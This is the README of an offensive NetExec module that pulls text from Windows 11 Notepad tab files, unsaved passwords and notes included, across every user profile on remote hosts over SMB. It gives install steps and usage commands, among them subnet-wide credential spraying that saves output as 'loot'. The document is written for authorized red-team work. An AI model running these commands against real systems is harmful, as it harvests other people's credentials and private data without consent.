# notepad_recovery — NetExec Module

A [NetExec](https://github.com/Pennyw0rth/NetExec) module that recovers content from Windows 11 Notepad's TabState `.bin` files across all user profiles on a target host over SMB.

## How it works

Windows 11 Notepad writes open tab content to binary files at:
```
C:\Users\<username>\AppData\Local\Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState\*.bin
```

These files are written in real time as the user types — even for unsaved tabs. This module reads and decodes those files remotely, recovering any plaintext content (passwords, notes, code, etc.) left open in Notepad.

## Requirements

- NetExec (`nxc`) installed
- Admin access to the target
- Target must be running **Windows 11** (the TabState feature is not present in Windows 10's built-in Notepad)

## Installation

```bash
git clone https://github.com/NEED-Programming/nxc-notepad-recovery.git
cp nxc-notepad-recovery/notepad_recovery.py ~/.nxc/modules/
```

Verify it loaded:
```bash
nxc smb -L | grep notepad_recovery
```

## Usage

```bash
# Basic
nxc smb <target> -u <user> -p <pass> -M notepad_recovery

# Local auth (useful when DC is unreachable)
nxc smb <target> -u administrator -p <pass> --local-auth -M notepad_recovery

# Custom output file
nxc smb <target> -u <user> -p <pass> -M notepad_recovery -o OUTFILE=/tmp/loot.txt

# Raise minimum text length filter
nxc smb <target> -u <user> -p <pass> -M notepad_recovery -o MIN_LEN=50

# Spray a subnet
nxc smb 192.168.1.0/24 -u <user> -p <pass> -M notepad_recovery
```

## Options

| Option | Default | Description |
|--------|---------|-------------|
| `OUTFILE` | `notepad_recovery_<host>.txt` | Local path to save recovered content |
| `MIN_LEN` | `20` | Minimum text length to include a tab's content |

## Example output

```
NOTEPAD_... 192.168.1.50 445  DESKTOP-ABC  [*] Searching TabState files across all user profiles...
NOTEPAD_... 192.168.1.50 445  DESKTOP-ABC  [+] Found 2 tab(s):
NOTEPAD_... 192.168.1.50 445  DESKTOP-ABC      === frankcastle | abc123.bin ===
NOTEPAD_... 192.168.1.50 445  DESKTOP-ABC      === administrator | def456.bin ===
NOTEPAD_... 192.168.1.50 445  DESKTOP-ABC  [+] Results saved to: /home/kali/notepad_recovery_192.168.1.50.txt
```

## Notes

- Requires admin privileges (`on_admin_login`)
- Iterates **all user profiles** under `C:\Users\`, not just the current user
- Files locked by an active Notepad session may be skipped silently
- The PowerShell payload is base64-encoded to avoid `cmd.exe` mangling `$` characters

## Legal

This tool is intended for authorized penetration testing and red team engagements only. Do not use against systems you do not have explicit permission to test.
